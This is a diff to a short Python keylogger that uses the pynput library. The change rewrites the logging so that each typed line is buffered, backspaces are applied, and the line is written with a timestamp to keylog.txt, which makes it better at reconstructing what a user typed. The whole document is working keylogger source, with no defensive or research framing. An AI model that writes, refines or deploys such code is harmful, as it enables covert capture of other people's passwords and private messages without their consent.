@@ -1,27 +1,28 @@
-from pynput import keyboard 
-#pip install pynput
-import os
+from pynput import keyboard
 from datetime import datetime
 
 log_file = "keylog.txt"
+log_buffer = ""
 
-def write_to_file(key):
+def write_to_file(text):
     with open(log_file, "a") as f:
-        f.write(f"{datetime.now()}: {key}\n")
+        f.write(text)
+        f.flush()
 
 def on_press(key):
+    global log_buffer
     try:
-        write_to_file(key.char)
+        log_buffer += key.char
     except AttributeError:
         if key == keyboard.Key.space:
-            write_to_file(" ")
+            log_buffer += " "
         elif key == keyboard.Key.enter:
-            write_to_file("\n")
+            write_to_file(f"{datetime.now()}: {log_buffer}\n")
+            log_buffer = ""
         elif key == keyboard.Key.backspace:
-            write_to_file("<BACKSPACE>")
+            log_buffer = log_buffer[:-1]
         else:
-            write_to_file(f"[{key}]")
+            log_buffer += f"<{key.name}>"
 
-# Start the listener
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
